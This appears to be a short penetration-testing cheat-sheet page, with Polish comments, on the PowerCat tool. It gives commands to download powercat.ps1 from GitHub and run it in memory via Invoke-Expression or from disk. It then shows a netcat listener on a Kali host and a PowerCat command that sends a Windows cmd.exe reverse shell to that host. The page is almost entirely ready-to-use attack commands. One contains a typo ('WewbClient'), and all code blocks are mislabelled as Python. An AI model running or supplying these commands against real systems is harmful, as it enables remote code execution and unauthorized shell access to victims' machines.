---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# PowerCat

**Win**

{% code overflow="wrap" fullWidth="true" %}
```python
#bez zapisywania na dysku
(New-Object System.Net.WewbClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1') | Invoke-Expression

#z zapisywaniem na dysku
Invoke-WebRequest -uri https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 -OutFile powerCat.ps1

#uruchamianie przy użyciu dot sourcing
. .\powercat.ps1
```
{% endcode %}

**Kali**

```python
nc -nlvp 8888
```

**Win**

```python
#łączymy się z Kalim
powercat -c 10.20.10.31 -p 8888 -e cmd.exe
```
